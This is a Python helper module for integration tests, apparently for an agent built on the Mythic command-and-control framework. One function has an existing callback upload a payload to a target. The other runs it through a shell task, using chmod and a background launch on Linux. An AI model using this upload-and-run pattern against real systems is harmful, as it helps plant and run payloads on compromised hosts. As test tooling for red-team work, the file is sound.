"""Payload upload and execution helpers for integration tests."""

from __future__ import annotations

from tests.integration.config_models import AgentConfig, TargetConfig


async def upload_payload_to_target(
    mythic_instance,
    payload_bytes: bytes,
    target: TargetConfig,
    agent_config: AgentConfig,
) -> str:
    """Upload a payload to a target system via an existing callback.

    Args:
        mythic_instance: Authenticated Mythic connection.
        payload_bytes: Raw payload content.
        target: Target system configuration.
        agent_config: Agent config (for filename).

    Returns:
        Mythic file_id of the uploaded file.
    """
    from mythic import mythic

    # Register the file with Mythic
    file_resp = await mythic.register_file(
        mythic_instance,
        filename=agent_config.filename,
        contents=payload_bytes,
    )
    file_id = file_resp["agent_file_id"]

    # Issue upload task to the pre-existing callback
    await mythic.issue_task(
        mythic_instance,
        command_name="upload",
        parameters={
            "file_id": file_id,
            "remote_path": target.upload_path,
        },
        callback_display_id=target.callback_id,
        wait_for_complete=True,
        timeout=120,
    )

    return file_id


async def execute_payload_on_target(
    mythic_instance,
    target: TargetConfig,
    agent_config: AgentConfig,
) -> None:
    """Execute an uploaded payload on the target system.

    Args:
        mythic_instance: Authenticated Mythic connection.
        target: Target system config (includes upload_path and callback_id).
        agent_config: Agent config (for OS-appropriate execution command).
    """
    from mythic import mythic

    if target.os == "Windows":
        command_params = {"command": target.upload_path}
    else:
        # Linux: make executable and run in background
        command_params = {"command": f"chmod +x {target.upload_path} && {target.upload_path} &"}

    await mythic.issue_task(
        mythic_instance,
        command_name="shell",
        parameters=command_params,
        callback_display_id=target.callback_id,
        wait_for_complete=False,
        timeout=30,
    )
